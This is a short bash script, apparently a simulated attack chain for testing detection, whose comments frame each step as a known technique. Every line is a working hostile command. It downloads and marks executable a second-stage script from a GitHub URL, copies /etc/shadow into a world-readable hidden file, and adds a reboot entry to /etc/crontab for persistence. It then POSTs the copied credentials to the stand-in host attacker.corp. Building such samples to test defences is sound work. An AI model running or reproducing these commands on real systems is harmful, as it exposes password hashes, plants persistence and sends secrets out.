#!/bin/bash

# === Step 1: Download another stage (looks like beaconing/downloading more payloads)
curl -o /tmp/beacon.sh https://raw.githubusercontent.com/raghul-simbian/attack/main/beacon.sh
chmod +x /tmp/beacon.sh

# === Step 2: Attempt credential theft (common TTP)
cp /etc/shadow /tmp/.creds_backup
chmod 777 /tmp/.creds_backup

# === Step 3: Persistence via crontab (known technique)
echo '@reboot /tmp/malware_script.sh' >> /etc/crontab

# === Step 4: Simulate data exfiltration (fake curl to attacker domain)
curl -X POST -d "@/tmp/.creds_backup" http://attacker.corp/data_upload

# === Step 5: Marker for execution validation
touch /tmp/payload_executed.log
